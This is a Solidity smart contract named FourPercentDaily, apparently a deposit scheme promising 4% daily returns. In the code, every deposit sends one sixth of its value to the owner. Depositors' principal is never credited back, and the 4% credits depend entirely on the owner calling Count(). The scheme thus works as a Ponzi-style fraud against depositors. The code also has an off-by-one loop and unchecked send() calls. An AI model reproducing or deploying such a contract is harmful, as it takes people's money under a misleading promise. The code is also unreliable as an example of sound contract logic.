 

 
                                                                                                                                                    
                                                                                                                                                     


contract FourPercentDaily
{
    struct _Tx {
        address txuser;
        uint txvalue;
    }
    _Tx[] public Tx;
    uint public counter;
    mapping (address => uint256) public accounts;

    
    address owner;
    
    
     
     
     
     
     
    function FourPercentDaily() {
        owner = msg.sender;
        
    }
    
    function() {
        Sort();
        if (msg.sender == owner )
        {
            Count();
        }
    }
    
    function Sort() internal
    {
        uint feecounter;
            feecounter+=msg.value/6;
	        owner.send(feecounter);
	  
	        feecounter=0;
	   uint txcounter=Tx.length;     
	   counter=Tx.length;
	   Tx.length++;
	   Tx[txcounter].txuser=msg.sender;
	   Tx[txcounter].txvalue=msg.value;   
    }
    
    function Count()  {
        
        if (msg.sender != owner) { throw; }
        
        while (counter>0) {
            
             
            uint distAmount = (Tx[counter].txvalue/100)*4;
            accounts[Tx[counter].txuser] = accounts[Tx[counter].txuser] + distAmount;
            counter-=1;
        }
    }
    
    function getMyAccountBalance() public returns(uint256) {
        return(accounts[msg.sender]);
    }
    
    function withdraw() public {
        if (accounts[msg.sender] == 0) { throw;}
        

        uint withdrawAmountNormal = accounts[msg.sender];
        accounts[msg.sender] = 0;
        msg.sender.send(withdrawAmountNormal);


      

        
    }
       
}